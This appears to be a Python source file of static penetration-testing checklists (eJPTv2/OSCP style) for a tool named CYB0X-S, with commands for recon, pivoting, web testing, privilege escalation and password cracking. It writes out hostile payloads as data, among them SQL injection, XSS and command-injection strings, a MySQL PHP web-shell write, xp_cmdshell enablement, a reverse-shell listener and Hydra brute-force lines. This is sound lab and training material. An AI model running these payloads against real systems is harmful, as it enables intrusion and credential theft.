"""Static methodology templates and tactical command references for CYB0X-S.

These templates represent standard manual penetration testing methodologies commonly
utilized in eJPTv2, OSCP, and lab assessments (curated from community best practices).

Strictly passive: these are human memory-aids and methodology tracking checklists.
They contain zero dynamic code, zero adaptive algorithms, and zero autonomous scanning.
"""

from __future__ import annotations

from typing import Any, Dict, List, Optional
from cyb0x_s.models import ChecklistItem, ChecklistStatus

STATIC_TEMPLATES: Dict[str, Dict[str, Any]] = {
    "ejpt": {
        "category": "EJPTv2 MASTER METHODOLOGY",
        "description": "Complete eJPTv2 multi-phase assessment workflow (Recon → Foothold → Pivoting → PrivEsc)",
        "items": [
            {
                "title": "1. Scope & Subnet Recon",
                "command": "ip a && ip route && route -n",
                "tip": "Verify assigned IP, subnet mask, interface names, and default gateway.",
            },
            {
                "title": "2. Host Discovery",
                "command": "arp-scan --localnet && fping -a -g <TARGET_SUBNET> 2>/dev/null",
                "tip": "Identify all active machines, routers, and gateway IPs on the local segment.",
            },
            {
                "title": "3. Port Discovery (TCP Full)",
                "command": "nmap -p- -sS -T4 <TARGET_IP>",
                "tip": "Run a full TCP SYN scan across all 65,535 ports to identify all open services.",
            },
            {
                "title": "4. Service & Version Detection",
                "command": "nmap -sC -sV -O -p <PORTS> <TARGET_IP>",
                "tip": "Run default scripts and version probing on all confirmed open ports.",
            },
            {
                "title": "5. Low-Hanging Fruit Inspection",
                "command": "ftp <TARGET_IP> (anon) | smbclient -N -L //<TARGET_IP>/ | onesixtyone -c public <TARGET_IP>",
                "tip": "Check anonymous FTP, null SMB sessions, SNMP public community strings, default logins.",
            },
            {
                "title": "6. Web Tech & Directory Fuzzing",
                "command": "whatweb http://<TARGET_IP> && feroxbuster -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt",
                "tip": "Review robots.txt, HTML comments, login portals, and hidden directories/files.",
            },
            {
                "title": "7. Manual Vulnerability Analysis",
                "command": "searchsploit \"<SERVICE_BANNER>\"",
                "tip": "Match exact software banners against known CVEs and verified exploit code.",
            },
            {
                "title": "8. Initial Foothold",
                "command": "nc -lvnp 4444",
                "tip": "Execute verified manual exploit or valid login credentials to get initial shell.",
            },
            {
                "title": "9. Local Host Recon",
                "command": "id && whoami /priv && ip a && route print",
                "tip": "Inspect current user context, assigned privileges, network interfaces, routing.",
            },
            {
                "title": "10. Pivoting & Secondary NICs",
                "command": "ip a | ifconfig | arp -a | netstat -antup",
                "tip": "Check for secondary network adapters, internal subnets, and listening internal services.",
            },
            {
                "title": "11. Routing & Tunnel Setup",
                "command": "route add <SUBNET> <MASK> <SESSION> | ssh -D 1080 -N -f user@<IP>",
                "tip": "Configure Metasploit autoroute + SOCKS5, or SSH dynamic forwarding / Chisel.",
            },
            {
                "title": "12. Internal Target Scanning",
                "command": "proxychains -q nmap -sT -Pn -n -p 21,22,80,445 <INTERNAL_IP>",
                "tip": "Scan internal hosts through SOCKS5 proxy tunnel (TCP connect scan).",
            },
            {
                "title": "13. Privilege Escalation",
                "command": "sudo -l | find / -perm -u=s 2>/dev/null | whoami /priv",
                "tip": "Elevate to root (Linux) or NT AUTHORITY\\SYSTEM (Windows) via local misconfigurations.",
            },
            {
                "title": "14. Proof & Flag Capture",
                "command": "whoami && ip a && cat proof.txt / type proof.txt",
                "tip": "Execute proof command, capture flag hash, and record screenshot reference.",
            },
        ],
    },
    "pivoting": {
        "category": "PIVOTING & ROUTING (eJPTv2)",
        "description": "Dual-homed host discovery, routing table setup, and pivot tunneling methodology",
        "items": [
            {
                "title": "1. Identify Secondary NICs",
                "command": "ip a | ifconfig | ipconfig /all",
                "tip": "Check for dual-homed network cards and internal subnets not directly accessible.",
            },
            {
                "title": "2. Inspect Routing Table",
                "command": "ip route | route print",
                "tip": "Determine default gateways and internal subnet routing paths.",
            },
            {
                "title": "3. Inspect ARP Neighbors",
                "command": "arp -a | ip neigh",
                "tip": "Examine known host IPs on the secondary network interface.",
            },
            {
                "title": "4. Ping Sweep Internal Subnet",
                "command": "for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i & done",
                "tip": "Run a fast bash loop ping sweep from compromised host to discover live IPs.",
            },
            {
                "title": "5. Metasploit Route Addition",
                "command": "route add 192.168.1.0 255.255.255.0 <SESSION_ID>",
                "tip": "Add internal subnet route inside msfconsole to route traffic through session.",
            },
            {
                "title": "6. Metasploit SOCKS5 Proxy",
                "command": "use auxiliary/server/socks_proxy; set SRVPORT 1080; set VERSION 5; run",
                "tip": "Launch local SOCKS5 proxy to bridge host OS tools into pivot network.",
            },
            {
                "title": "7. SSH Dynamic Port Forwarding",
                "command": "ssh -D 1080 -N -f user@<TARGET_IP>",
                "tip": "Create clean SOCKS5 proxy via SSH if SSH credentials or keys are compromised.",
            },
            {
                "title": "8. Reverse Chisel Tunnel",
                "command": "chisel server -p 8000 --reverse (attacker) / chisel client <IP>:8000 R:1080:socks (victim)",
                "tip": "Fast standalone tunneling when SSH or Metasploit is not viable.",
            },
            {
                "title": "9. Configure /etc/proxychains4.conf",
                "command": "echo \"socks5 127.0.0.1 1080\" >> /etc/proxychains4.conf",
                "tip": "Ensure quiet_mode is un-commented to avoid proxy spam in tool outputs.",
            },
            {
                "title": "10. Scan Internal Pivot Target",
                "command": "proxychains -q nmap -sT -Pn -n -p 21,22,80,445 <INTERNAL_IP>",
                "tip": "Always use TCP Connect (-sT) and skip ping (-Pn) when scanning through proxies.",
            },
            {
                "title": "11. Web Browsing via Pivot",
                "command": "FoxyProxy -> SOCKS5 127.0.0.1:1080",
                "tip": "Configure browser proxy to browse internal web applications through the tunnel.",
            },
            {
                "title": "12. Exploit Pivot Services",
                "command": "proxychains smbclient -N -L //<INTERNAL_IP>/",
                "tip": "Execute exploitation tools through proxychains against internal machines.",
            },
        ],
    },
    "web": {
        "category": "WEB APPLICATION TESTING",
        "description": "Standard web application manual testing methodology (OWASP & eJPTv2 focus)",
        "items": [
            {
                "title": "1. Server Banner & Tech Stack",
                "command": "whatweb -a 3 http://<TARGET_IP>",
                "tip": "Identify web server, scripting language, CMS, and reverse proxy headers.",
            },
            {
                "title": "2. Robots & Site Metadata",
                "command": "curl -s http://<TARGET_IP>/robots.txt",
                "tip": "Check robots.txt, sitemap.xml, crossdomain.xml, and security.txt.",
            },
            {
                "title": "3. HTML & JavaScript Source",
                "command": "curl -s http://<TARGET_IP> | grep -iE \"TODO|admin|password|api\"",
                "tip": "Review client-side comments, hidden input fields, and script endpoints.",
            },
            {
                "title": "4. Directory & File Fuzzing",
                "command": "feroxbuster -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak",
                "tip": "Search for administrative portals, upload endpoints, and backup files.",
            },
            {
                "title": "5. Virtual Host Enumeration",
                "command": "gobuster vhost -u http://<TARGET_IP> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
                "tip": "Test for distinct virtual hosts routing via Host: header manipulation.",
            },
            {
                "title": "6. Default Admin Credentials",
                "command": "admin:admin | admin:password | root:root | test:test",
                "tip": "Test common default credentials on discovered login forms.",
            },
            {
                "title": "7. Cookie & Session Attributes",
                "command": "curl -I http://<TARGET_IP>",
                "tip": "Inspect Set-Cookie headers for missing HttpOnly, Secure, or SameSite flags.",
            },
            {
                "title": "8. SQL Injection Testing",
                "command": "' OR 1=1-- | ' UNION SELECT NULL,NULL--",
                "tip": "Fuzz all GET/POST input parameters for SQL error reflection and boolean bypass.",
            },
            {
                "title": "9. Path Traversal & LFI",
                "command": "curl http://<TARGET_IP>/page.php?file=../../../../etc/passwd",
                "tip": "Test file include parameters with null bytes (%00) and traversal sequences.",
            },
            {
                "title": "10. Cross-Site Scripting (XSS)",
                "command": "<script>alert(document.cookie)</script> | <img src=x onerror=alert(1)>",
                "tip": "Check if user input is reflected unsanitized in the HTML response body.",
            },
            {
                "title": "11. OS Command Injection",
                "command": "; id | | whoami | $(id) | `id`",
                "tip": "Test command execution in pingers, form formatters, and export features.",
            },
            {
                "title": "12. File Upload Bypass",
                "command": "Upload shell.php5 / shell.phtml / shell.phar / double extension shell.jpg.php",
                "tip": "Bypass client-side checks, tamper Content-Type, and test execution paths.",
            },
            {
                "title": "13. CMS Scanning",
                "command": "wpscan --url http://<TARGET_IP> --enumerate u,vp,vt",
                "tip": "Enumerate WordPress/Drupal plugins, themes, and vulnerable components.",
            },
            {
                "title": "14. API & Swagger Endpoints",
                "command": "curl http://<TARGET_IP>/api/v1/swagger.json",
                "tip": "Inspect REST APIs, JSON endpoints, and IDOR access control boundaries.",
            },
        ],
    },
    "smb": {
        "category": "SMB ENUMERATION",
        "description": "SMB & Windows file sharing enumeration methodology",
        "items": [
            {
                "title": "1. SMB Dialect & Signing",
                "command": "crackmapexec smb <TARGET_IP> / nxc smb <TARGET_IP>",
                "tip": "Identify SMB version, computer name, domain name, and signing requirement.",
            },
            {
                "title": "2. Anonymous Null Session",
                "command": "smbclient -N -L //<TARGET_IP>/",
                "tip": "Test anonymous share listing without supplying any credentials.",
            },
            {
                "title": "3. Share Read/Write Permissions",
                "command": "smbclient -N //<TARGET_IP>/<SHARE_NAME>",
                "tip": "Connect to shares and verify read, write, and directory traversal permissions.",
            },
            {
                "title": "4. Search Shares for Data",
                "command": "recurse ON; prompt OFF; mget *.txt *.conf *.bak *.zip",
                "tip": "Download discovered configuration files, scripts, and archives.",
            },
            {
                "title": "5. Comprehensive Enum4Linux",
                "command": "enum4linux-ng -A <TARGET_IP>",
                "tip": "Extract users, groups, password policy, shares, and OS build details.",
            },
            {
                "title": "6. User Enum via RPC",
                "command": "rpcclient -U '' <TARGET_IP> -c \"enumdomusers; querydispinfo\"",
                "tip": "Query local and domain users via null RPC session.",
            },
            {
                "title": "7. RID Cycling Brute-Force",
                "command": "crackmapexec smb <TARGET_IP> -u '' -p '' --rid-brute 1000",
                "tip": "Enumerate usernames by brute-forcing relative security identifiers (RIDs).",
            },
            {
                "title": "8. Domain Password Policy",
                "command": "crackmapexec smb <TARGET_IP> --pass-pol",
                "tip": "Inspect lockout threshold and duration before attempting password spraying.",
            },
        ],
    },
    "discovery": {
        "category": "NETWORK & HOST DISCOVERY",
        "description": "Standard host discovery and network mapping methodology",
        "items": [
            {
                "title": "1. Local Network Inspection",
                "command": "ip a && ip route && route -n",
                "tip": "Determine attacker IP, CIDR subnet, and default gateway.",
            },
            {
                "title": "2. Local ARP Sweep",
                "command": "arp-scan --localnet",
                "tip": "Identify live hosts on layer 2 without generating TCP packets.",
            },
            {
                "title": "3. ICMP Ping Sweep",
                "command": "fping -a -g <TARGET_SUBNET> 2>/dev/null",
                "tip": "Fast asynchronous ping sweep to discover responsive IP addresses.",
            },
            {
                "title": "4. OS Guess via TTL",
                "command": "ping -c 1 <TARGET_IP>",
                "tip": "TTL around 64 indicates Linux/Unix; TTL around 128 indicates Windows.",
            },
            {
                "title": "5. Fast TCP Port Discovery",
                "command": "nmap -F <TARGET_IP>",
                "tip": "Quick scan of the top 100 ports for rapid triage.",
            },
            {
                "title": "6. Identify Gateways & Routers",
                "command": "traceroute -n <TARGET_IP>",
                "tip": "Map network hops and locate firewalls or multi-homed devices.",
            },
        ],
    },
    "linux": {
        "category": "LINUX ENUMERATION",
        "description": "Standard manual Linux host enumeration and privilege escalation checklist",
        "items": [
            {
                "title": "1. User Context & Groups",
                "command": "id && groups && whoami",
                "tip": "Check if user is in sudo, wheel, docker, lxd, or adm groups.",
            },
            {
                "title": "2. Kernel & OS Distribution",
                "command": "uname -a && cat /etc/os-release",
                "tip": "Check kernel version for dirtycow, overlayfs, or known kernel exploits.",
            },
            {
                "title": "3. Sudo Privileges",
                "command": "sudo -l",
                "tip": "Inspect allowed sudo commands; check GTFOBins for privilege escalation bypasses.",
            },
            {
                "title": "4. SUID / SGID Binaries",
                "command": "find / -perm -u=s -type f 2>/dev/null",
                "tip": "Cross-reference unusual SUID binaries on GTFOBins.",
            },
            {
                "title": "5. Linux Capabilities",
                "command": "getcap -r / 2>/dev/null",
                "tip": "Look for binaries with cap_setuid, cap_dac_read_search, or cap_sys_admin.",
            },
            {
                "title": "6. Scheduled Cron Jobs",
                "command": "cat /etc/crontab /etc/cron.* && crontab -l",
                "tip": "Check for user-writable scripts executing periodically as root.",
            },
            {
                "title": "7. Listening Internal Ports",
                "command": "ss -tulpn || netstat -antup",
                "tip": "Check for internal database or management ports bound to 127.0.0.1.",
            },
            {
                "title": "8. Running Root Processes",
                "command": "ps aux | grep root",
                "tip": "Look for custom background daemons or scripts executed by root.",
            },
            {
                "title": "9. Writable /etc/passwd or shadow",
                "command": "ls -l /etc/passwd /etc/shadow",
                "tip": "If /etc/passwd is writable, append a root user with custom salt.",
            },
            {
                "title": "10. Plaintext Credential Leaks",
                "command": "cat ~/.bash_history && grep -ri \"password\" /var/www/html/ 2>/dev/null",
                "tip": "Search bash history and web config files (wp-config.php, database.php) for passwords.",
            },
            {
                "title": "11. NFS No Root Squash",
                "command": "cat /etc/exports",
                "tip": "Check for exported shares configured with no_root_squash.",
            },
        ],
    },
    "windows": {
        "category": "WINDOWS ENUMERATION",
        "description": "Standard manual Windows host enumeration and privilege escalation checklist",
        "items": [
            {
                "title": "1. User Privileges & Tokens",
                "command": "whoami /priv && whoami /groups",
                "tip": "Look for SeImpersonatePrivilege or SeAssignPrimaryToken (PrintSpoofer / GodPotato).",
            },
            {
                "title": "2. OS Build & Hotfixes",
                "command": "systeminfo | findstr /B /C:\"OS Name\" /C:\"System Type\"",
                "tip": "Identify Windows build number and check for missing security updates.",
            },
            {
                "title": "3. Unquoted Service Paths",
                "command": "wmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /v \"C:\\Windows\\\"",
                "tip": "Check if unquoted paths contain spaces and user-writable directories.",
            },
            {
                "title": "4. Service Permissions",
                "command": "accesschk.exe -uwcqv \"Authenticated Users\" * / sc qc <service>",
                "tip": "Check if service configuration (binpath) can be modified by current user.",
            },
            {
                "title": "5. AlwaysInstallElevated",
                "command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                "tip": "If 0x1, craft an MSI payload with msfvenom to execute as SYSTEM.",
            },
            {
                "title": "6. Scheduled Tasks",
                "command": "schtasks /query /fo LIST /v",
                "tip": "Look for custom scheduled tasks executing as SYSTEM with writable binaries.",
            },
            {
                "title": "7. Windows Credential Manager",
                "command": "cmdkey /list",
                "tip": "If saved credentials exist, execute commands as target user via runas /savecred.",
            },
            {
                "title": "8. AutoLogon Registry Passwords",
                "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
                "tip": "Check for DefaultPassword, DefaultUserName, and AltDefaultPassword values.",
            },
            {
                "title": "9. Unattend / Sysprep Files",
                "command": "dir /s /b C:\\Unattend.xml C:\\sysprep.inf C:\\sysprep.xml",
                "tip": "Search for plaintext administrative credentials in deployment answer files.",
            },
        ],
    },
    "ftp": {
        "category": "FTP ENUMERATION",
        "description": "File Transfer Protocol enumeration and inspection checklist",
        "items": [
            {
                "title": "1. Banner & Version Probing",
                "command": "nc -vn <TARGET_IP> 21",
                "tip": "Check for vsftpd 2.3.4 backdoor or ProFTPD known CVE vulnerabilities.",
            },
            {
                "title": "2. Anonymous Authentication",
                "command": "ftp <TARGET_IP> (username: anonymous, password: blank)",
                "tip": "Check if anonymous read access is permitted.",
            },
            {
                "title": "3. List Hidden Files",
                "command": "ls -la",
                "tip": "Inspect all files including hidden dotfiles and nested directories.",
            },
            {
                "title": "4. Download Configurations",
                "command": "binary && mget *",
                "tip": "Download discovered backup files, source code, and credentials in binary mode.",
            },
            {
                "title": "5. Test Write / Upload Permissions",
                "command": "put test.txt",
                "tip": "If writable and FTP root maps to web server, upload a web shell.",
            },
            {
                "title": "6. Online Password Brute-Force",
                "command": "hydra -L users.txt -P rockyou.txt ftp://<TARGET_IP>",
                "tip": "Brute-force FTP credentials with Hydra if valid usernames are known.",
            },
        ],
    },
    "ssh": {
        "category": "SSH ENUMERATION",
        "description": "Secure Shell configuration and credential testing checklist",
        "items": [
            {
                "title": "1. Banner & Version CVEs",
                "command": "nc -vn <TARGET_IP> 22",
                "tip": "Inspect OpenSSH banner; check for user enumeration CVEs.",
            },
            {
                "title": "2. Root Login Permission",
                "command": "ssh root@<TARGET_IP>",
                "tip": "Check if root login is permitted with password authentication.",
            },
            {
                "title": "3. Harvested Private Key Test",
                "command": "chmod 600 id_rsa && ssh -i id_rsa user@<TARGET_IP>",
                "tip": "Always ensure 0600 permissions before testing discovered private keys.",
            },
            {
                "title": "4. Passphrase Cracking",
                "command": "ssh2john.py id_rsa > hash && john --wordlist=rockyou.txt hash",
                "tip": "If private key is encrypted with passphrase, crack using John.",
            },
            {
                "title": "5. Credential Spraying",
                "command": "hydra -L users.txt -P passwords.txt ssh://<TARGET_IP> -t 4",
                "tip": "Test discovered credentials against SSH service with low thread count.",
            },
        ],
    },
    "snmp": {
        "category": "SNMP ENUMERATION",
        "description": "SNMP (UDP 161) community string and MIB enumeration checklist",
        "items": [
            {
                "title": "1. Community String Brute-Force",
                "command": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <TARGET_IP>",
                "tip": "Brute-force community strings; test public, private, manager, community.",
            },
            {
                "title": "2. System Information MIB",
                "command": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.1",
                "tip": "Extract OS banner, hostname, contact, and system uptime.",
            },
            {
                "title": "3. Running Process Tree",
                "command": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2",
                "tip": "List all active processes running on the target machine.",
            },
            {
                "title": "4. Installed Software Inventory",
                "command": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2",
                "tip": "Enumerate installed packages and third-party software.",
            },
            {
                "title": "5. Network Interfaces & IPs",
                "command": "snmpwalk -v2c -c public <TARGET_IP> ipAddrTable",
                "tip": "Discover secondary network interfaces and hidden internal subnets.",
            },
            {
                "title": "6. User Account Enumeration",
                "command": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.4.1.77.1.2.25",
                "tip": "Extract local Windows/Unix user accounts via SNMP.",
            },
        ],
    },
    "databases": {
        "category": "DATABASE SERVICES",
        "description": "Database enumeration checklist (MySQL 3306, MSSQL 1433, PostgreSQL 5432)",
        "items": [
            {
                "title": "1. Default Admin Logins",
                "command": "mysql -u root -h <TARGET_IP> (blank) / sqsh -S <TARGET_IP> -U sa",
                "tip": "Test default administrative accounts with blank passwords.",
            },
            {
                "title": "2. Discovered Credential Testing",
                "command": "mysql -u <USER> -p -h <TARGET_IP>",
                "tip": "Test web application credentials found in config files against database port.",
            },
            {
                "title": "3. Database & Table Dumping",
                "command": "SHOW DATABASES; USE <DB>; SHOW TABLES; SELECT * FROM users;",
                "tip": "Dump user tables, password hashes, and sensitive application data.",
            },
            {
                "title": "4. MySQL File Read (LOAD_FILE)",
                "command": "SELECT LOAD_FILE('/etc/passwd');",
                "tip": "Read sensitive local files via MySQL administrative account.",
            },
            {
                "title": "5. MySQL Web Shell Upload",
                "command": "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';",
                "tip": "Write web shell if MySQL user has FILE privileges and directory is writable.",
            },
            {
                "title": "6. MSSQL Command Execution",
                "command": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';",
                "tip": "Enable xp_cmdshell on MSSQL to execute operating system commands.",
            },
        ],
    },
    "cracking": {
        "category": "PASSWORD & HASH CRACKING",
        "description": "Hash identification, password cracking, and online brute-forcing methodology",
        "items": [
            {
                "title": "1. Identify Hash Format",
                "command": "hashid -m <HASH> / hash-identifier",
                "tip": "Determine hash type: MD5 (0), SHA256 (1400), NTLM (1000), NetNTLMv2 (5600).",
            },
            {
                "title": "2. John the Ripper Cracking",
                "command": "john --wordlist=/usr/share/wordlists/rockyou.txt --format=<FORMAT> hashes.txt",
                "tip": "Crack CPU-based hashes using John the Ripper with rockyou.txt.",
            },
            {
                "title": "3. Hashcat GPU Cracking",
                "command": "hashcat -m <MODE> -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
                "tip": "Accelerated GPU password recovery using Hashcat.",
            },
            {
                "title": "4. Hydra Online HTTP Brute-Force",
                "command": "hydra <TARGET_IP> http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=invalid\" -L users.txt -P rockyou.txt",
                "tip": "Target web login forms using Hydra with correct failure condition string.",
            },
            {
                "title": "5. Credential Reuse Testing",
                "command": "Test cracked credentials across SSH, SMB, RDP, WinRM, and Web portals",
                "tip": "Users frequently reuse cracked passwords across different machines and services.",
            },
        ],
    },
    "privesc": {
        "category": "PRIVILEGE ESCALATION",
        "description": "Cross-platform privilege escalation checklist (Linux & Windows low-hanging fruit)",
        "items": [
            {
                "title": "[Linux] Sudo Rights & GTFOBins",
                "command": "sudo -l",
                "tip": "Check if current user can run any binary as root.",
            },
            {
                "title": "[Linux] SUID Executables",
                "command": "find / -perm -u=s -type f 2>/dev/null",
                "tip": "Look for custom or GTFOBins-vulnerable SUID executables.",
            },
            {
                "title": "[Linux] Cron Jobs & Timers",
                "command": "cat /etc/crontab /etc/cron.*",
                "tip": "Look for user-writable scheduled scripts.",
            },
            {
                "title": "[Windows] SeImpersonatePrivilege",
                "command": "whoami /priv",
                "tip": "If enabled, exploit via PrintSpoofer or GodPotato for SYSTEM shell.",
            },
            {
                "title": "[Windows] Unquoted Service Paths",
                "command": "wmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /v \"C:\\Windows\\\"",
                "tip": "Look for unquoted paths with spaces in writable folders.",
            },
            {
                "title": "[Windows] Saved Credentials",
                "command": "cmdkey /list",
                "tip": "Check for stored credentials in Windows Credential Manager.",
            },
        ],
    },
}

TEMPLATE_ALIASES: Dict[str, str] = {
    "linux-privesc": "linux",
    "windows-privesc": "windows",
    "net": "discovery",
    "scan": "discovery",
    "routing": "pivoting",
    "tunnel": "pivoting",
    "db": "databases",
    "sql": "databases",
    "crack": "cracking",
    "hashes": "cracking",
}


def get_available_templates() -> List[str]:
    """Return list of canonical template names."""
    return list(STATIC_TEMPLATES.keys())


def load_template(template_name: str) -> Optional[Dict[str, Any]]:
    """Retrieve template definition by name, supporting common aliases."""
    name_clean = template_name.strip().lower()
    canonical = TEMPLATE_ALIASES.get(name_clean, name_clean)
    return STATIC_TEMPLATES.get(canonical)


def get_template_guidance_for_title(title: str) -> Optional[Dict[str, str]]:
    """Find command and tip guidance matching a checklist item title."""
    title_clean = title.strip().lower()
    for tmpl in STATIC_TEMPLATES.values():
        for entry in tmpl["items"]:
            item_t = entry["title"] if isinstance(entry, dict) else str(entry)
            if item_t.strip().lower() == title_clean:
                if isinstance(entry, dict):
                    return {"command": entry.get("command", ""), "tip": entry.get("tip", "")}
    return None


def get_guidance_for_service(service_name: str, port: int) -> Optional[Dict[str, str]]:
    """Return instant ready-to-paste command and tip guidance for a given port / service."""
    s_low = service_name.strip().lower()
    if s_low in ("smb", "microsoft-ds", "netbios-ssn") or port in (139, 445):
        return {
            "command": "smbclient -N -L //<TARGET_IP>/ && smbmap -u guest -p '' -d . -H <TARGET_IP>",
            "tip": "Test null session shares with smbclient and smbmap. Use rpcclient to dump users.",
        }
    elif s_low in ("http", "https", "http-proxy", "web", "apache", "nginx", "iis") or port in (80, 443, 8080, 8000, 8081, 8888, 5000):
        proto = "https" if port == 443 or "https" in s_low else "http"
        port_suffix = f":{port}" if port not in (80, 443) else ""
        return {
            "command": f"whatweb {proto}://<TARGET_IP>{port_suffix}/ && feroxbuster -u {proto}://<TARGET_IP>{port_suffix}/ -w /usr/share/wordlists/dirb/common.txt",
            "tip": "Inspect web technologies, robots.txt, and fuzz directories with feroxbuster or gobuster.",
        }
    elif s_low == "ssh" or port == 22:
        return {
            "command": "ssh <USER>@<TARGET_IP> | hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>",
            "tip": "Connect using discovered credentials or perform targeted wordlist attack with Hydra.",
        }
    elif s_low in ("winrm", "wsman") or port in (5985, 5986):
        return {
            "command": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PW>'",
            "tip": "Spawn interactive remote PowerShell console over WinRM using valid credentials.",
        }
    elif s_low in ("rdp", "ms-wbt-server") or port == 3389:
        return {
            "command": "xfreerdp /u:<USER> /p:'<PW>' /v:<TARGET_IP> /fonts /smart-sizing",
            "tip": "Connect to graphical desktop session or check BlueKeep CVE-2019-0708 with Metasploit.",
        }
    elif s_low in ("mssql", "ms-sql-s") or port == 1433:
        return {
            "command": "nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password='',ms-sql-xp-cmdshell.cmd='type C:\\flag.txt' <TARGET_IP>",
            "tip": "Audit MSSQL for empty passwords, dump password hashes, and test xp_cmdshell command execution.",
        }
    elif s_low in ("mysql",) or port == 3306:
        return {
            "command": "mysql -h <TARGET_IP> -u root -p",
            "tip": "Connect to MySQL. Test select load_file('/etc/shadow') or nmap mysql-dump-hashes.",
        }
    elif s_low in ("ftp",) or port == 21:
        return {
            "command": "ftp <TARGET_IP> (login anonymous:anonymous)",
            "tip": "Check anonymous login and file download/upload permissions.",
        }
    elif s_low in ("snmp",) or port == 161:
        return {
            "command": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <TARGET_IP> && snmpwalk -v2c -c public <TARGET_IP>",
            "tip": "Brute-force community strings with onesixtyone and extract running processes and network interfaces.",
        }
    return None



def apply_template_to_store(
    store: Any,
    template_name: str,
    target_id: Optional[int] = None,
) -> List[ChecklistItem]:
    """Load a static template and instantiate checklist items into the store."""
    tmpl = load_template(template_name)
    if not tmpl:
        valid_options = ", ".join(get_available_templates())
        raise ValueError(f"Unknown template: '{template_name}'. Available templates: {valid_options}")

    category = tmpl["category"]
    created_items: List[ChecklistItem] = []
    for entry in tmpl["items"]:
        item_title = entry["title"] if isinstance(entry, dict) else str(entry)
        item = store.add_checklist_item(
            title=item_title,
            category=category,
            target_id=target_id,
            status=ChecklistStatus.TODO,
        )
        created_items.append(item)
    return created_items
